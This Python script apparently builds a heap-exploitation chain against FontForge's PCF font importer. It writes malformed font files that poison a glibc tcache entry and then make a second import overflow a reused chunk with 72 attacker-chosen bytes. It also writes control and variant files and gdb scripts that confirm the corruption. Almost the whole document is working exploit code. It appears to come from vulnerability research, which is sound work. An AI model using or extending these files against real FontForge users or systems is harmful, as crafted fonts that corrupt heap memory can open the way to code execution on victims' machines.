#!/usr/bin/env python3
"""W7: turn W5's poisoned tcache entry into a FILE-CHOSEN byte consumer.

size-71.pcf  : 4 metrics glyphs, one index cut after low byte 0xfe ->
               glyph=-2, RHS 0x71 at encs-8, so free(encs) puts the
               physically 0x20 chunk into tcache bin 5 (0x70 chunks).
choice-4.pcf : complete 4-glyph PCF. The second Import()'s pcf_properties()
               does props = malloc(cnt*sizeof(struct props)) = malloc(96)
               (cnt=3), a 0x70 chunk; the poisoned encs is returned. The
               loop at fvimportbdf.c:1465-1469 fills all 96 bytes with
               file-derived integers, 72 of them past the physical chunk's
               24 usable bytes. The notice smprintf(97) at :2326 briefly
               takes and frees the entry just before this allocation.
choice-4-var.pcf differs by ONE file byte: props[2].name_offset 0x17 -> 0x1a.
               Both files' second import are otherwise identical, so a
               changed byte at poisoned-chunk offset 0x40 proves the
               overflow bytes come from the PCF file.
choice-4-control.pcf is identical to choice-4.pcf, but the first import is
               an in-bounds control (size-complete-71.pcf), no poison.
"""
import hashlib
import pathlib
import struct

HERE = pathlib.Path(__file__).resolve().parent
BASE = (HERE / "truncated.pcf").read_bytes()
PROPS = BASE[0x48:0x94]


def first_case(name, min1, low_byte=None, full_index=None):
    data = bytearray(BASE[:0x123])
    struct.pack_into("<HHHH", data, 0x118, 0, 0, min1, min1)
    if low_byte is not None:
        data[0x122] = low_byte
    else:
        data[0x122:0x124] = struct.pack("<H", full_index)
    (HERE / name).write_bytes(data)


def full_pcf(nglyphs, bitmap_payload, sizebitmaps):
    """Build a complete PCF with a caller-supplied bitmap-table payload."""
    off_props = 0x08 + 4 * 16
    off_metrics = off_props + len(PROPS)
    metrics = struct.pack("<II", 0, nglyphs) + b"".join(
        struct.pack("<hhhhhh", 0, 8, 8, 8, 0, 0) for _ in range(nglyphs)
    )
    off_bitmaps = off_metrics + len(metrics)
    bitmaps = struct.pack("<II", 0, nglyphs)
    for i in range(nglyphs):
        bitmaps += struct.pack("<I", i * 8)
    bitmaps += struct.pack("<IIII", *([sizebitmaps] * 4))
    assert len(bitmap_payload) == sizebitmaps
    bitmaps += bitmap_payload
    off_enc = off_bitmaps + len(bitmaps)
    enc = struct.pack("<IHHHHH", 0, 0, 0, 0, 0, 0) + b"".join(
        struct.pack("<H", i) for i in range(nglyphs)
    )
    toc = [
        (1, 0, len(PROPS) // 4, off_props),
        (4, 0, len(metrics) // 4, off_metrics),
        (8, 0, len(bitmaps) // 4, off_bitmaps),
        (32, 0, len(enc) // 4, off_enc),
    ]
    out = bytearray(struct.pack("<II", 0x70636601, 4))
    for entry in toc:
        out += struct.pack("<IIII", *entry)
    assert len(out) == off_props
    out += PROPS + metrics + bitmaps + enc
    return bytes(out)


payload = bytes(32) + bytes.fromhex("4d4953484f4f5345" * 7)[:56]
assert len(payload) == 88

first_case("size-71.pcf", 0x0071, low_byte=0xFE)
first_case("size-complete-71.pcf", 0x0071, full_index=0x0001)
(HERE / "choice-4.pcf").write_bytes(full_pcf(4, payload, 88))
(HERE / "choice-4-control.pcf").write_bytes(full_pcf(4, payload, 88))
_var = bytearray((HERE / "choice-4.pcf").read_bytes())
assert _var[0x62] == 0x17
_var[0x62] = 0x1A
(HERE / "choice-4-var.pcf").write_bytes(_var)

(HERE / "import-filechoice.ff").write_text(
    "New()\n"
    f'Import("{HERE / "size-71.pcf"}")\n'
    f'Import("{HERE / "choice-4.pcf"}")\n'
)
(HERE / "import-filechoice-control.ff").write_text(
    "New()\n"
    f'Import("{HERE / "size-complete-71.pcf"}")\n'
    f'Import("{HERE / "choice-4-control.pcf"}")\n'
)
(HERE / "import-filechoice-var.ff").write_text(
    "New()\n"
    f'Import("{HERE / "size-71.pcf"}")\n'
    f'Import("{HERE / "choice-4-var.pcf"}")\n'
)

(HERE / "gdb-props-consumer.cmd").write_text(
    "set pagination off\n"
    "set confirm off\n"
    "break fvimportbdf.c:1751 if glyph < 0\n"
    "run -script import-filechoice.ff\n"
    "set $encsp=(char*)encs\n"
    'printf "POISON ptr=%p glyph=%d size=%lx\\n", $encsp, glyph, *(long*)($encsp-8)\n'
    "delete 1\n"
    "break fvimportbdf.c:1469 if props==$encsp\n"
    "continue\n"
    'printf "PROPS ptr=%p encsp=%p equal=%d cnt=%d\\n", props, $encsp, props==$encsp, cnt\n'
    "bt 3\n"
    "x/96bx props\n"
    "continue\n"
    "quit\n"
)
(HERE / "gdb-props-var.cmd").write_text(
    (HERE / "gdb-props-consumer.cmd").read_text().replace(
        "import-filechoice.ff", "import-filechoice-var.ff")
)

for name in ("size-71.pcf", "size-complete-71.pcf", "choice-4.pcf",
             "choice-4-control.pcf", "choice-4-var.pcf", "import-filechoice.ff",
             "import-filechoice-control.ff", "import-filechoice-var.ff",
             "gdb-props-consumer.cmd", "gdb-props-var.cmd"):
    data = (HERE / name).read_bytes()
    print(f"{name}: {len(data)} bytes sha256={hashlib.sha256(data).hexdigest()}")
